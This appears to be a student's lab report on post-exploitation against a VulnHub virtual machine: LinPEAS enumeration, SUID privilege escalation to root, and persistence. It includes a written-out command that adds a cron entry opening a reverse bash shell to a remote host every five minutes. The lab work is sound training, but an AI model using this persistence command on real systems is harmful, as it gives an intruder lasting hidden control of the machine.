010	SUID Exploit	192.168.1.150	Success	Root Shell
Practical Steps Documented

1. Enumeration with LinPEAS:

Ran LinPEAS to identify misconfigurations and privilege escalation vectors.

Found SUID binaries and other kernel vulnerabilities that allow escalation to root.

2. Privilege Escalation:

Exploited a vulnerable SUID binary using LinPEAS recommendations.

Successfully obtained a root shell.

3. Establishing Persistence:

Created a cron job to maintain access after reboot:

echo "*/5 * * * * /usr/bin/bash -i > /dev/tcp/192.168.1.101/4444 0>&1" >> /etc/crontab


Verified cron job execution to ensure continuous access.

Checklist for Lab Report

Run LinPEAS on the target VM for comprehensive enumeration.

Identify SUID and kernel vulnerabilities suitable for privilege escalation.

Exploit discovered vulnerabilities to escalate privileges to root.

Set up persistence using cron jobs or services.

Document commands, steps, and outcomes with screenshots.

Summary (50 words)

Performed privilege escalation on a VulnHub VM using LinPEAS to identify SUID vulnerabilities. Successfully exploited a SUID binary to gain root shell access. Established persistence by creating a cron job to maintain remote access. Lab demonstrated systematic enumeration, exploitation, and persistence setup, providing practical experience in post-exploitation techniques.
